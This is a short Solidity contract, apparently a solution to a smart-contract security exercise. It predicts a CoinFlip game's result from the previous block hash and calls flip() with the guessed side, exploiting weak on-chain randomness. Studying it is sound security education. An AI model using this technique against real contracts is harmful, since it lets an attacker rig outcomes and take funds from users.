contract CoinFlipAttack {
    
    using SafeMath for uint256;
    CoinFlip public target;
    
    constructor(address _target) public {
        target = CoinFlip(_target);
    }
    
    function attack() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        
        target.flip(side);
    }
}